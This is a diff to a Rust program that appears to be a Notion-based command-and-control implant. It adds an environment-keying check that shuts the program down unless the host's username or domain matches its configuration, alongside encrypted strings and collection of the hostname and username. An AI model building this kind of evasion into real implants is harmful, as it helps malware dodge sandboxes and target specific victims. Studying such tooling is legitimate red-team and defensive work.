@@ -33,6 +33,7 @@ mod cmd;
 use cmd::{NotionCommand, CommandType};
 mod logger;
 use logger::log_out;
+mod env_check;
 
 use_litcrypt!();
 
@@ -105,9 +106,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             };
         }
     }
-    
-    let mut hn = hostname();
 
+    // Before anything else happens, we key to the env if the config has been set.
+    // match the keyed results. This is boiled down to a bool to account for any type of keying (by username, domain, etc)
+    if env_check::check_env_keys(&config_options).await {
+        logger.info(log_out!("Keys match; continuing..."))
+    } else {
+        logger.crit(log_out!("Env check failure. Shutting down..."));
+        exit(1)
+    }
+
+    let mut hn = hostname();
     let username = whoami::username();
     hn.push_str(" | ");
     hn.push_str(&username);
